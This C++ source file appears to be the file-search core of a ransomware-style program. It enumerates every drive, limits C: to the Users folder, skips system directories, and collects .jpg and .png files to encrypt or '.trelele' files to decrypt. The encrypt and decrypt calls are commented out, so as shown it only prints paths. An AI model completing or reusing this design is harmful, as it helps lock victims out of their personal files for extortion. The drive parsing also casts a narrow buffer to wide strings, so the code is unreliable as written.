#include "include/common.h"
#include "include/crypt.h"
#include "include/search.h"

std::string systemDrive[30];
char driveBuffer[100];
std::vector<std::string> dirSkipList{ "Windows", "Program Files", "Program Files (x86)", "Program Data", "Temp", "AppData", "SteamLibrary" };

void getDrive() {
	while (systemDrive[0] == "") {
		if (strlen(driveBuffer) != 0) {
			for (int i = 0, j = 0, k = 0; i < 100; i++) {
				if (driveBuffer[i] != '\0') {
					systemDrive[k] += driveBuffer[i];
					j++;
				}
				if (j == 3) {
					j = 0;
					k++;
				}
			}
		}
		else {
			DWORD driveStat = GetLogicalDriveStringsW(sizeof(driveBuffer), (LPWSTR)driveBuffer);
		}
	}
}

void isCSysDir() {
	for (int i = 0; i < 30; i++) {
		if (systemDrive[i] == "C:\\") {
			systemDrive[i] = "C:\\Users\\";
			break;
		}
	}
}

void searchInDir(std::filesystem::path& path, bool isEncrypt) {
	try {
		if (std::filesystem::exists(path) && std::filesystem::is_directory(path)) {
			std::error_code ec;
			std::filesystem::recursive_directory_iterator dir(path, std::filesystem::directory_options::skip_permission_denied, ec), end;

			while (dir != end) {
				if (std::filesystem::is_directory(dir->path()) && (std::find(dirSkipList.begin(), dirSkipList.end(), dir->path().filename()) != dirSkipList.end())) {
					dir.disable_recursion_pending();
				}
				else if (dir->path().has_extension() && (isEncrypt ? (dir->path().extension() == ".jpg" || dir->path().extension() == ".png") : (dir->path().extension() == ".trelele"))) {
					//targetFile.push_back(dir->path());
					std::cout << dir->path().string();
					//isEncrypt ? encrypt(dir->path()) : decrypt(dir->path());
				}
				dir++;
				if (ec) {
					std::cerr << "Error While Accessing : " << dir->path().string() << " :: " << ec.message() << '\n';
				}
			}
		}
	}
	catch (std::system_error& e) {
		std::cerr << "Exception :: " << e.what();
	}
}

int main() {
	int chs;
	std::cout << "select number to encrypt or decrypt , 1. encrypt , 2. decrypt \n";

	while (true) {
		std::cin >> chs;
		if (chs == 1) {
			getDrive();
			isCSysDir();
			for (int i = 0; i < 30; i++) {
				if (systemDrive[i] != "") {
					std::filesystem::path path = systemDrive[i];
					searchInDir(path, true);
				}
			}
		}
		else if (chs == 2) {
			getDrive();
			isCSysDir();
			for (int i = 0; i < 30; i++) {
				if (systemDrive[i] != "") {
					std::filesystem::path path = systemDrive[i];
					searchInDir(path, false);
				}
			}
		}
		else {
			break;
		}
	}
	return EXIT_SUCCESS;
}